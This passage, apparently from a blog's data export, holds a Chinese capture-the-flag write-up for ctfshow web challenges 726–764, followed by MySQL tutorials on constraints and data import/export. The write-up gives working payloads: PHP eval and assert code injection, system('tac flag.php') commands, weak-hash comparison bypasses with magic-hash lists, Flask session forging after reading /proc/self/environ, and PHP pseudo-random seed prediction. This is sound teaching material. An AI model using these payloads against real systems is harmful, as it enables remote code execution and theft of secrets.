函数的第二个参数的问题）\n\n我们首先传入`username=;eval($_POST[1]);`\n![](/img/ctfshow/web入门/web726-1.jpg)\n\n\n这时，`config.php`文件中的内容为\n```php\n<?php\n$option=';phpinfo();';\n```\n\n因为在`preg_replace`函数中`\\\\0`和`$0`代表完整的模式匹配文本\n\n所以当我们传入`username=$0`后\n`config.php`的内容就变成了\n```php\n<?php\n$db='$db=';eval($_POST[1]);';';\n```\n两个单引号刚好闭合上，成功构造出`eval`函数\n\n访问config.php，传入`1=system('tac flag.php');`,拿到flag\n![](/img/ctfshow/web入门/web726-2.jpg)\n\n# WEB728 #\n\nF12看源码\n\n```php\n<!-- CTFSHOW hint:\n        $file = \"templates/\" . $page . \".php\";            //将page变量拼接成一个templates下的php文件，设置为变量file\n        assert(\"strpos('$file', '..') === false\") or die(\"hack!\");            //判断file中是否有\" .. \"，如果有则直接退出\n-->\n```\n利用`')`闭合，并使用`//`注释后面的内容，以执行我们的命令\n\npayload：\n`1') or system('tac ./templates/flag.php');//`\n\n\n# WEB729 #\n\nF12看到代码\n```php\n<!-- CTFSHOW hint:\n              $flag_input = $_POST['flag'];\n              if((strcmp(flag_input,$flag)))\n              {\n                die(\"flag不正确\");\n              }\n              $_p = 6543;\n              $_l = 21;\n\n              $l = strlen($_GET['secret']);\n              $_i = intval($_GET['secret']);\n              if($l !== $_l || $_i !== $_p)\n              {\n                die(\"系统异常\");\n              }\n\n              echo \"< !--$flag-- >\";\n-->\n```\n我们需要过两个if的判断\n\n第一个if：\n`strcmp()`函数的作用是比较两个字符串，相同则为0。因为`strcmp`函数无法比较数组，会返回0，将flag输入为数组即可绕过。\n\n第二个if：\n要满足两个条件，长度为21，整数值为6534\n\n\n综上所述，构造的payload为\n```\nPOST /?secret=6543aaaaaaaaaaaaaaaaa\nflag[]=1\n```\n\n# WEB731 #\n\nF12看到hint\n一个sha1的弱比较\n传入一个0e开头的值即可\n\n```php\n<!-- CTFSHOW hint:\n              $hash = sha1($_GET['hash']);\n              $target = sha1(10932435112);\n              if($hash == $target) {\n                  include('flag.php');\n                  print $flag;\n              }\n-->\n```\n参考值\n```\naaroZmOk:0e66507019969427134894567494305185566735\naaK1STfY:0e76658526655756207688271159624026011393\naaO8zKZF:0e89257456677279068558073954252716165668\naa3OFF9m:0e36977786278517984959260394024281014729\nw9KASOk6Ikap:0e94685489941557404937568181716894429726\nCZbnUtm/wD+0:00e6513589156647795423839906410117726741\nRSnake33ncxYMsiIgw:00e0446570916533934353629798824448898569\nhashcatRhtkuysFOYYh:0ec6007027368764166354656983137779429045\nhashcat7YfJg9x6AqNA:0e50220802416020462770479580634172053582\nhashcatJbYtCyUf7I3K:00e9121985231400931761319208500866143806\nhashcatZJCFhv5hhkxM:0e22622630708604282251577618083953362629\nhashcat7gqQ5KzDJRDe:0e89084512868781863087376038568650856166\nhashcatU4BRJMv0wZQ9:0e26648206422262155598429612413699840868\nhashcat6gP5u3LfjkB4:00e4745251895202147342658062640046218324\nhashcatGqnE8xnyDXTf:0e15969028436788874806413050149455726924\nhashcatirBCZWadC4V6:0e31649851810187193299309281808938075168\nhashcat0vScS1X5pWWD:00e8504108085943725027274200432213595492\nhashcat46AOYaAyyXRm:0e12074483623118174676713113381129899097\nhashcatHArOfcXelAhD:00e4559098389903496918609646734123833089\nhashcatQH5Q477JNSPy:0e55688066453591945830139349969019185986\nhashcatw1ZBfRtYm5oM:0e05033562275990914578610618694299895931\nhashcatoSz6YKuiFR3Y:0ee0160094252962728385313526058227602671\nhashcatypQJbFRa1dZt:0e55105030693666790285044072061907048558\nhashcatFN2n52JGTFx5:0e44883634200812439498749585501922916636\n0e00000000000000000000081614617300000000:0e65307525940999632287492285468259219070\n0e00000000000000000000721902017120000000:0e94981159498252295418182453841140483274\n0e01011001101011010001101110101100101000:0e48906523151976751117677463787111106598\n0e11001000001010011000100000010001101000:0e63407184960930419027062777705081379452\n0e01000001100000001010011011001000000100:0e55962072388397083814346733718698213796\n0e10011110000101101000011101011010100100:0e31188585417285828785355336774237712792\n0e01010111000111111010101011010111010100:0e45906344569616659428808892091261969181\n0e00100001110000001111010000010011101100:0e14860258669052332549568607710438132953\n0e11110000111010001001101111111110010010:0e12174258436385758552874426941686538483\n0e10111110011100101100010101111010000110:0e99774398282593376043462038572281385389\n0e11001111110111110010111010000011110110:0e63185221301034624940345471074357888797\n0e00001010010101100100101011101110001110:0e90943988772171749054413593888105986782\n0e01011101110010111011110010010010101110:0e01608800192659803576771346607441737826\n0e10111110101111001000000100011101101110:0e49094541458479495263034294421025186938\n0e11100111101110011010111001010101111110:0e55770706149948760086200713505841887543\n0e11111001010101100110011001010001110001:0e91120687121163809515824135435029958137\n0e01000111101111110010010010000001001001:0e78071797328546369301825420848872451849\n0e00100110100010100110001101110110110101:0e06077380408260614659219920561082767632\n0e11111100001011000011110100100010111101:0e12149120354415335220758399492713921588\n0e00111100110101101001000101011011111101:0e38661126569790555598431905065403870516\n0e10100011100101000001110010100110100011:0e55745078154640212511596259055910278070\n0e10011110011111001001100100000111011011:0e20319731123101477913295720812414482217\n&O&GKtn&54xQ:00e8144605926111857621787045161777776795\nSk~HOM&QzJXl:00e8943083323373991014599597566984182387\n1023456852390915:0e26379374770352024666148968868586665768\nlowercasegzmgqmx:0e46257280787231943618306073689855362607\nlowercasifdvqkfr:0e11372668415308535558155136274413213182\nlowercasebchqcwctky:0e63270019212961791900055698786302314274\nlowercaseabcsobpkrt:0e54706107047262165256262457226759421225\nUPPERCASFFLIIQWR:00e0209539108131630074694125235505223102\nMixedCaseERWqTVQ:0e26765837881628507475765845815158037783\nMixCaseDigJiRR9d:00e6970695351422324349039381794949865825\nPunc!0\"*!\"#$8!zv:0e77726009946581613829608157794165640009\nPunctu!U\"F5ru:0e10005769841271999406141555258742283712\nPunctuatiow$'l9X:0e16039695246683143323677708220808911326\nPunctuati0t..jsI:0e77237948969014118794910091659528041921\n```\n\n# WEB732 #\n\nF12得到hint:password.js\n```php\n<!-- CTFSHOW hint:\n              password.js\n-->\n```\n\n访问后发现是被混淆过的js代码\n```js\nvar _0x575c=['\\x32\\x2d\\x34','\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67','\\x34\\x2d\\x37','\\x67\\x65\\x74\\x49\\x74\\x65\\x6d','\\x64\\x65\\x6c\\x65\\x74\\x65\\x49\\x74\\x65\\x6d','\\x31\\x32\\x2d\\x31\\x34','\\x30\\x2d\\x32','\\x73\\x65\\x74\\x49\\x74\\x65\\x6d','\\x39\\x2d\\x31\\x32','\\x5e\\x37\\x4d','\\x75\\x70\\x64\\x61\\x74\\x65\\x49\\x74\\x65\\x6d','\\x62\\x62\\x3d','\\x37\\x2d\\x39','\\x31\\x34\\x2d\\x31\\x36','\\x6c\\x6f\\x63\\x61\\x6c\\x53\\x74\\x6f\\x72\\x61\\x67\\x65',];(function(_0x4f0aae,_0x575cf8){var _0x51eea2=function(_0x180eeb){while(--_0x180eeb){_0x4f0aae['push'](_0x4f0aae['shift']());}};_0x51eea2(++_0x575cf8);}(_0x575c,0x78));var _0x51ee=function(_0x4f0aae,_0x575cf8){_0x4f0aae=_0x4f0aae-0x0;var _0x51eea2=_0x575c[_0x4f0aae];return _0x51eea2;};function CheckPassword(_0x47df21){var _0x4bbdc3=[_0x51ee('0xe'),_0x51ee('0x3'),_0x51ee('0x7'),_0x51ee('0x4'),_0x51ee('0xa')];window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('9-12','BE*');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x2'),_0x51ee('0xb'));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x6'),'5W');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('16',_0x51ee('0x9'));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x5'),'pg');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('7-9','+n');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0xd'),'4t');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x0'),'$F');if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x8'))===_0x47df21[_0x51ee('0x1')](0x9,0xc)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x2'))===_0x47df21['substring'](0x4,0x7)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x6'))===_0x47df21[_0x51ee('0x1')](0x0,0x2)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]('16')===_0x47df21[_0x51ee('0x1')](0x10)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x5'))===_0x47df21[_0x51ee('0x1')](0xc,0xe)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0xc'))===_0x47df21[_0x51ee('0x1')](0x7,0x9)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0xd'))===_0x47df21[_0x51ee('0x1')](0xe,0x10)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x0'))===_0x47df21[_0x51ee('0x1')](0x2,0x4))return!![];}}}}}}}return![];}\n```\n\n[在线解密](https://www.sojson.com/jsjiemi.html)后js代码：\n\n```js\nvar _0x575c = ['2-4', 'substring', '4-7', 'getItem', 'deleteItem', '12-14', '0-2', 'setItem', '9-12', '^7M', 'updateItem', 'bb=', '7-9', '14-16', 'localStorage', ];\n(function(_0x4f0aae, _0x575cf8) {\n    var _0x51eea2 = function(_0x180eeb) {\n        while (--_0x180eeb) {\n            _0x4f0aae['push'](_0x4f0aae['shift']());\n        }\n    };\n    _0x51eea2(++_0x575cf8);\n}(_0x575c, 0x78));\nvar _0x51ee = function(_0x4f0aae, _0x575cf8) {\n    _0x4f0aae = _0x4f0aae - 0x0;\n    var _0x51eea2 = _0x575c[_0x4f0aae];\n    return _0x51eea2;\n};\n\nfunction CheckPassword(_0x47df21) {\n    var _0x4bbdc3 = [_0x51ee('0xe'), _0x51ee('0x3'), _0x51ee('0x7'), _0x51ee('0x4'), _0x51ee('0xa')];\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('9-12', 'BE*');\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x2'), _0x51ee('0xb'));\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x6'), '5W');\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('16', _0x51ee('0x9'));\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x5'), 'pg');\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('7-9', '+n');\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0xd'), '4t');\n    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x0'), '$F');\n    if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x8')) === _0x47df21[_0x51ee('0x1')](0x9, 0xc)) {\n        if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x2')) === _0x47df21['substring'](0x4, 0x7)) {\n            if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x6')) === _0x47df21[_0x51ee('0x1')](0x0, 0x2)) {\n                if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]('16') === _0x47df21[_0x51ee('0x1')](0x10)) {\n                    if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x5')) === _0x47df21[_0x51ee('0x1')](0xc, 0xe)) {\n                        if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0xc')) === _0x47df21[_0x51ee('0x1')](0x7, 0x9)) {\n                            if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0xd')) === _0x47df21[_0x51ee('0x1')](0xe, 0x10)) {\n                                if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x0')) === _0x47df21[_0x51ee('0x1')](0x2, 0x4)) return !![];\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return ![];\n}\n```\n\n\n可以看到密码被拆分成很多部分，且顺序被打乱了，但是元素赋值和检查密码的顺序是一样的\n\n先看第一个：`if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x8')) === _0x47df21[_0x51ee('0x1')](9, 12))`对应的就是9-12位是`window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('9-12', 'BE*');`，值为'BE*'\n\n第二个：`if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x2')) === _0x47df21['substring'](4, 7)) {`密码的4-7位就是`window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x2'), _0x51ee('0xb'));`,值为`_0x51ee('0xb')`\n\n\n其他的以此类推\n但是有两个特殊的地方，第4-7和第16\n第4-7值为`_0x51ee('0xb')`，对应的是`_0x575c`数组的第11位,值为`bb=`\n第16值为`_0x51ee('0x9')`，对应的是`_0x575c`数组的第9为，值为`^7M`\n\n我的分析过程图：\n![](/img/ctfshow/web入门/web732.jpg)\n\n\n# WEB736 #\n题目出自[PASECA2019]honey_shop\n\n打开题目，是一个商店，还有一个价值\\$1337的flag，但我们只有\\$1336\n所以这一题的目标应该是修改价格来购买flag了\n![](/img/ctfshow/web入门/web736-1.jpg)\n\n抓包可以看到session的值\n![](/img/ctfshow/web入门/web736-2.jpg)\n\n通过脚本解密\n```python\n#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b'.', 1)\n    payload, timestamp = payload.rsplit(b'.', 1)\n\n    decompress = False\n    if payload.startswith(b'.'):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception('Could not base64 decode the payload because of '\n                         'an exception')\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception('Could not zlib decompress the payload before '\n                             'decoding the payload')\n\n    return session_json_serializer.loads(payload)\n\nif __name__ == '__main__':\n    print(decryption(sys.argv[1].encode()))\n```\n得到`{'balance': 1336, 'purchases': []}`\n其中balance为当前余额，purchases值为空\n![](/img/ctfshow/web入门/web736-3.jpg)\n\n\n如果我们要伪造`session`，修改余额，那么就需要知道`SECRET_KEY`的值\n\n页面中还有一个提示`*click to download our sweet images*`\n下载后格式为`/download?image=`，这种格式容易造成任意文件读取\n\n读取环境变量中的`python版本`和`SECRET_KEY`\n\n>/proc/self/environ:当前正在运行的进程的环境变量列表\n\n![](/img/ctfshow/web入门/web736-4.jpg)\n\n\n拿到`SECRET_KEY`后就可以进行session伪造了\n要注意python3和python2的结果不一样，所以上一步读了python的版本\n[脚本地址](https://github.com/noraj/flask-session-cookie-manager)\n\n修改金额后进行伪造\n`python flask_session_cookie_manager3.py encode -s \"ctfshowsecretkeyhereyouneverknow\" -t \"{'balance': 1337, 'purchases': []}\" `\n\n![](/img/ctfshow/web入门/web736-5.jpg)\n\n再次购买，购买成功\n![](/img/ctfshow/web入门/web736-6.jpg)\n\n# WEB743 #\n\nF12\n\n```php\n<!-- CTFSHOW hint:\n            if($a != $b && md5($a) == md5($b))\n            {\n                if ($c != $d && sha1($c) == sha1($d))\n                {\n                    echo $flag;\n                }\n            }\n        -->\n```\n简单弱比较，传数组\n![](/img/ctfshow/web入门/web743.jpg)\n\n\n# WEB756 #\n/source.txt得到源码\n```php\ninclude \"flag.php\";\n$code = $_POST['code'];\neval(\"var_dump($$code);\");\n```\n这一题重点是理解`$$code`；\n\n举个例子\n![](/img/ctfshow/web入门/web756-1.jpg)\n`$$b`其实相当于`$($b)`,所以会输出1\n\n理解后很容易想到php中自带的变量之一`$GLOBALS`\n传入后就会以数组的形式返回值，得到flag\n\n\n# WEB758 #\n/source.txt得到源码\n```php\n  $url = $_GET['url'];\n  $file = './spider/'.$_GET['file'];\n\n  if((strpos($url,'http://127.0.0.1/') === 0) || strpos($url,'https://www.baidu.com/') === 0){\n    file_put_contents($file, file_get_contents($url));\n    die(\"文件保存在$file\");\n  }\n```\n首先限制了开头的字符串必须是`http://127.0.0.1/`或`https://www.baidu.com/`\n然后从`$url`获取内容然后写入`$file`\n\n首先传入`?url=http://127.0.0.1/&file=<?php phpinfo();?>`\n![](/img/ctfshow/web入门/web758-1.jpg)\n看到成功保存了\n那么我们可以将这个内容再次保存到文件中\n\n即`?url=http://127.0.0.1/?url=http://127.0.0.1/&file=<?php phpinfo();?>&file=1.php`\n\n但是要注意的是要因为访问两次所以url编码两次\n\n\n所以payload为`?url=http://127.0.0.1/?url=http://127.0.0.1/%26file=%253C%253Fphp%2520phpinfo%2528%2529%253B%2520%253F%253E&file=1.php`\n\n访问1.php就行了\n\n\n# WEB760 #\nF12\n```php\nCTFSHOW hint:\n                  if (ereg ('\\.', $_GET['^_^'])) $smile = 0;\n                  if (ereg ('%', $_GET['^_^'])) $smile = 0;\n                  if (ereg ('[0-9]', $_GET['^_^'])) $smile = 0;\n                  if (ereg ('http', $_GET['^_^']) ) $smile = 0;\n                  if (ereg ('https', $_GET['^_^']) ) $smile = 0;\n                  if (ereg ('ftp', $_GET['^_^'])) $smile = 0;\n                  if (ereg ('telnet', $_GET['^_^'])) $smile = 0;\n                  if (ereg ('_', $_SERVER['QUERY_STRING'])) $smile = 0;\n                  if ($smile) {\n                      if (@file_exists ($_GET['^_^'])) $smile = 0;\n                  }\n                  if ($smile) {\n                    $smile = @file_get_contents ($_GET['^_^']);\n                    if ($smile === \"(●'◡'●)\") die($flag);\n                  }\n```\n\n`$_SERVER[\"QUERY_STRING\"]` 获取的是?后面的值,比如`http://localhost/aaa/index.php?p=222&q=333`中`$_SERVER['QUERY_STRING'] = \"p=222&q=333\";`\n\n`$_GET['^_^']`就包含了`_`，但是`$_SERVER[\"QUERY_STRING\"]`却不允许有`_`,这是矛盾的\n\n在php中变量名中的点和空格会被转换成下划线。例如 `<input name=\"a.b\" />` 变成了 `$_REQUEST[\"a_b\"]`\n这样我们可以传入`^.^`来绕过\n\n`file_exists`判断文件是否存在，这里必须不存在，但是却要`file_get_contents`读到文件内容\n\n因为`http`等协议被禁用，所以不能远程包含了，这里采用`data://`来读取\n\n而且file_exists 对于 data 指向内容判断为不存在\n![](/img/ctfshow/web入门/web760.jpg)\n\n最终的payload为：`?^.^=data://text/plain,(●'◡'●)`或`?^.^=data://text/plain;charset=unicode,(●'◡'●)`\n\n\n\n# WEB761 #\nF12\n```php\nif($value==md5($value)){\n                  echo $flag;\n                }\n```\n百度一个0e开头的值，且这个值md5后还是0e开头\n![](/img/ctfshow/web入门/web761.jpg)\n\n\n# WEB764 #\n\nsource.txt看到源码\n\n```php\nsession_start();\nif(isset($_GET['id'])){\n  $login = $_GET['id'];\n  if(!@isset($login['cookie'])||$login['cookie'] != @md5($_SESSION['flag'])){\n      die('error!');\n  }else{\n      mt_srand(substr($login['cookie'],17,7));\n      $content = \"<?php \\$flag=\".\"'\".$flag.\"'\".\"?>\";\n      $filename = (string)mt_rand().\".php\";\n      file_put_contents($filename,$content);\n      mt_srand(mt_rand());\n      if ($_POST['key'] == mt_rand())\n      {\n          echo file_get_contents(${$_POST[mt_rand()]});\n      }\n  }\n}\n```\n\n第一个if判断：\n因为`!isset($login['cookie'])`肯定为false\n所以要满足`$login['cookie']`与`md5($_SESSION['flag'])`相等\n\n在本地跑出`md5($_SESSION['flag'])`结果为`d41d8cd98f00b204e9800998ecf8427e`\n```php\n<?php\nsession_start();\n$a = md5($_SESSION['flag']);\necho $a;\n?>\n```\n\n根据题目传`?id[cookie]=d41d8cd98f00b204e9800998ecf8427e`,不在返回error\n\n\nelse内容分析：\n以cookie中第17位开始向后7位,播种随机数生成器\n```php\nmt_srand(substr($login['cookie'],17,7));\n```\n\n拼接字符串和flag，赋给`$content`\n```php\n$content = \"<?php \\$flag=\".\"'\".$flag.\"'\".\"?>\";\n```\n\n\n返回一个随机数，并加上.php后缀,赋给`$filename`\n```php\n$filename = (string)mt_rand().\".php\";\n```\n\n写入文件\n```php\nfile_put_contents($filename,$content);\n```\n\n\n以随机数生成器生成的第二个随机数重新生成新的随机数生成器\n```php\nmt_srand(mt_rand());\n```\n\n\nPOST传参,令参数key与新的随机数生成器生成的随机数相等,即可进入IF判断\n```php\nif ($_POST['key'] == mt_rand())\n```\n\n\n生成第二个随机数\n```php\necho file_get_contents(${$_POST[mt_rand()]});\n```\n\n\n本地构写几个mt_rand()结果,源码如下\n```php\n<?php\nerror_reporting(0);\nsession_start();\nmt_srand(substr('d41d8cd98f00b204e9800998ecf8427e',17,7));\necho mt_rand().'</br>';\nmt_srand(mt_rand());\necho mt_rand().'</br>';\necho mt_rand().'</br>';\n?>\n```\n运行结果如下，可以看到结果是固定的，这就是php的伪随机数问题\n```php\n1160121479</br>\n954576979</br>\n1277894509</br>\n```\n\nPOST传参，参数名为新的随机数生成器生成的第二个随机数\n```php\necho file_get_contents(${$_POST[mt_rand()]});\n```\n\n\n最后POST传：key=954576979&1277894509=filename\n\n因为`$_POST[mt_rand()]`前还有一个`$`,所以传入的`filename`会变成`$filename`,这样就读到了flag","tags":["wp","ctfshow-web入门"],"categories":["wp"]},{"title":"mysql从入门到入土（四）","url":"/posts/8ef1554f/","content":"\n\n# 约束 #\n\n\n\n## 主键约束 ##\n\n>主键（PRIMARY KEY）的完整称呼是“主键约束”，是 MySQL 中使用最为频繁的约束。一般情况下，为了便于 DBMS 更快的查找到表中的记录，都会在表中设置一个主键。\n\n主键分为单字段主键和多字段联合主键\n\n关键参数`primary key`\n\n### 单字段主键 ###\n![](/img/数据库/mysql4-1.jpg)\n\n\n### 多字段主键 ###\n![](/img/数据库/mysql4-2.jpg)\n\n\n\n\n\n## 自增长 ##\n\n>默认情况下，AUTO_INCREMENT 的初始值是 1，每新增一条记录，字段值自动加 1。\n>一个表中只能有一个字段使用 AUTO_INCREMENT 约束，且该字段必须有唯一索引，以避免序号重复（即为主键或主键的一部分）。\n>AUTO_INCREMENT 约束的字段必须具备 NOT NULL 属性。\n>AUTO_INCREMENT 约束的字段只能是整数类型（TINYINT、SMALLINT、INT、BIGINT 等）。\n>AUTO_INCREMENT 约束字段的最大值受该字段的数据类型约束，如果达到上限，AUTO_INCREMENT 就会失效。\n\n关键参数`auto_increment`\n\n### 主键自增长 ###\n![](/img/数据库/mysql4-3.jpg)\n\n### 指定开始的值 ###\n例如从100开始自增\n![](/img/数据库/mysql4-4.jpg)\n\n\n\n## 唯一约束 ##\n\n>MySQL 唯一约束（Unique Key）是指所有记录中字段的值不能重复出现。例如，为 id 字段加上唯一性约束后，每条记录的 id 值都是唯一的，不能出现重复的情况。如果其中一条记录的 id 值为‘0001’，那么该表中就不能出现另一条记录的 id 值也为‘0001’。\n\n>唯一约束与主键约束相似的是它们都可以确保列的唯一性。不同的是，唯一约束在一个表中可有多个，并且设置唯一约束的列允许有空值，但是只能有一个空值。而主键约束在一个表中只能有一个，且不允许有空值。比如，在用户信息表中，为了避免表中用户名重名，可以把用户名设置为唯一约束。\n\n关键参数`unique`\n\n![](/img/数据库/mysql4-5.jpg)\n\n\n\n## 非空约束 ##\n\n>MySQL 非空约束（NOT NULL）指字段的值不能为空。对于使用了非空约束的字段，如果用户在添加数据时没有指定值，数据库系统就会报错。可以通过 CREATE TABLE 或 ALTER TABLE 语句实现。在表中某个列的定义后加上关键字 NOT NULL 作为限定词，来约束该列的取值不能为空。\n\n>比如，在用户信息表中，如果不添加用户名，那么这条用户信息就是无效的，这时就可以为用户名字段设置非空约束。\n\n关键参数`not null`\n\n除了email，其他不允许有空值\n![](/img/数据库/mysql4-6.jpg)\n\n\n\n\n## 默认值 ##\n\n>默认值（Default）的完整称呼是“默认值约束（Default Constraint）”，用来指定某列的默认值。在表中插入一条新记录时，如果没有为某个字段赋值，系统就会自动为这个字段插入默认值。\n\n关键参数`default`\n\n![](/img/数据库/mysql4-7.jpg)\n\n\n\n\n## 外键约束 ##\n\n>MySQL 外键约束（FOREIGN KEY）是表的一个特殊字段，经常与主键约束一起使用。对于两个具有关联关系的表而言，相关联字段中主键所在的表就是主表（父表），外键所在的表就是从表（子表）。\n\n关键参数`foreign key() references table()`\n\n表1：\n```\nMariaDB [test]> desc table1;\n+-------+-------------+------+-----+---------+-------+\n| Field | Type        | Null | Key | Default | Extra |\n+-------+-------------+------+-----+---------+-------+\n| id    | int(11)     | NO   | PRI | NULL    |       |\n| name  | varchar(15) | YES  |     | NULL    |       |\n| age   | int(11)     | YES  |     | NULL    |       |\n+-------+-------------+------+-----+---------+-------+\n3 rows in set (0.00 sec)\n```\n\n表二：\n```\nMariaDB [test]> create table table2(id int primary key,age int,name varchar(12),foreign key(age) references table1(id));\nQuery OK, 0 rows affected (0.00 sec)\n\nMariaDB [test]> desc table2;\n+-------+-------------+------+-----+---------+-------+\n| Field | Type        | Null | Key | Default | Extra |\n+-------+-------------+------+-----+---------+-------+\n| id    | int(11)     | NO   | PRI | NULL    |       |\n| age   | int(11)     | YES  | MUL | NULL    |       |\n| name  | varchar(12) | YES  |     | NULL    |       |\n+-------+-------------+------+-----+---------+-------+\n3 rows in set (0.00 sec)\n```\n\n>注意：从表的外键关联的必须是主表的主键，且主键和外键的数据类型必须一致。例如，两者都是 INT 类型，或者都是 CHAR 类型。如果不满足这样的要求，在创建从表时，就会出现“ERROR 1005(HY000): Can't create table”错误。\n\n\n\n\n## 检查约束 ##\n\n>MySQL 检查约束（CHECK）是用来检查数据表中字段值有效性的一种手段，可以通过 CREATE TABLE 或 ALTER TABLE 语句实现。设置检查约束时要根据实际情况进行设置，这样能够减少无效数据的输入。\n\n>默认值约束和非空约束也可看作是特殊的检查约束。\n\n关键参数`check`\n\n但是设置了检查约束后并不会生效\n\n* check不生效是为mysql的bug *\n```\n官网原文:\nCHECK\nThe CHECK clause is parsed but ignored by all storage engines. See Section 1.8.2.3, “Foreign Key Differences”.\n```\n\n>解决方法：\n\n>1：如果要设置CHECK约束的字段范围小，并且比较容易列举全部的值，就可以考虑将该字段的类型设置为枚举类型 enum()或集合类型set()。\n\n>2:如果需要设置CHECK约束的字段范围大，且列举全部值比较困难，比如整数或者某一区间，那就只能使用触发器来代替约束实现数据的有效性了","tags":["基础知识","mysql"],"categories":["mysql"]},{"title":"mysql从入门到入土（三）","url":"/posts/39dc4c2a/","content":"\n\n\n\n# 添加数据 #\n\n```\nINSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN );\n```\n>如果数据是字符型，必须使用单引号或者双引号，如：\"value\"。\n\n\n# 删除数据 #\n\n删除`ttt`表中`id`等于`1`的数据\n```\ndelete from ttt where id=1;\n```\n\n# 插入字段 #\n\n>alter table [表格名] Add column [要添加的字段] [字段类型] AFTER [哪个字段后面加];\n\n在`Password`后插入一个`char(8)`类型的`host`字段\n![](/img/数据库/mysql3-1.jpg)\n\n## 插入字段并判断有效值 ##\n\n>CHECK约束就是当向表中插入一行或更新一行数据时进行CHECK约束检查，CHECK接受一个表达式，如果这个表达式为TRUE则允许插入，如果这个表达式为FALSE则拒绝插入，在MariaDB10.2版本才开始支持CHECK。\n\n>alter table [表格名] add [要添加的字段] [字段类型] [check约束] after [哪个字段后面加];\n\n要满足条件age=21或22才允许插入\n`alter table userinfo add age int check(age=21 or age=22) after name;`\n\n# 删除字段 #\n\n>alter table [表格名] drop column [要删除的字段名];\n\n\n# 更新数据 #\n\n>update [表格名] set [修改的内容] where [条件];\n\n# 中文数据支持（修改编码格式） #\n\n正常插入一条中文数据会显示不出来，因为默认编码是latin1\n![](/img/数据库/mysql3-2.jpg)\n\n查看数据库默认编码\n`show variables like 'char%';`\n\n查看指定数据库默认编码\n`show create database [数据库];`\n\n创建数据库指定字符集\n`create database [数据库名称] character set utf8;`\n\n创建表指定字符集\n`create table [表名和字段] charset=utf8; `\n\n\n\n# 导入导出库和表 #\n## 导出数据库和表 ##\n导出`aaa`库，以`aaa.sql`为文件名保存\n```\nmysqldump -u root -p123 aaa > aaa.sql\n```\n\n导出`aaa.ttt`表，以`ttt.sql`为文件名保存\n```\nmysqldump -u root -p123 aaa ttt > ttt.sql\n```\n\n## 导入数据库和表 ##\n导入`aaa`这个数据库\n注意要先创建一个`aaa`库\n```\nmysqldump -u root -p123 aaa < aaa.sql\n```\n\n导入`ttt`表\n```\nMariaDB [(none)]> use aaa;                      //进入数据库\nMariaDB [aaa]> source /root/ttt.sql           //导入sql\n```\n## 导入txt ##\n\n表结构\n```\nMariaDB [test]> desc sj;\n+----------+-------------+------+-----+---------+-------+\n| Field    | Type        | Null | Key | Default | Extra |\n+----------+-------------+------+-----+---------+-------+\n| ID       | int(11)     | NO   | PRI | NULL    |       |\n| Name     | varchar(10) | YES  |     | NULL    |       |\n| Day      | date        | YES  |     | NULL    |       |\n| Password | varchar(16) | YES  |     | NULL    |       |\n+----------+-------------+------+-----+---------+-------+\n4 rows in set (0.00 sec)\n```\n\nsql.txt内容\n```\n[root@localhost ~]# cat sql.txt\n3,张三,2000-01-02,zhangsan\n4,李四,2001-06-15,123456\n```\n\n表中已有内容\n```\nMariaDB [test]> select * from sj;\n+----+--------+------------+------------------+\n| ID | Name   | Day        | Password         |\n+----+--------+------------+------------------+\n|  1 | w      | 1999-11-07 | f1290186a5d0b1ce |\n|  2 | 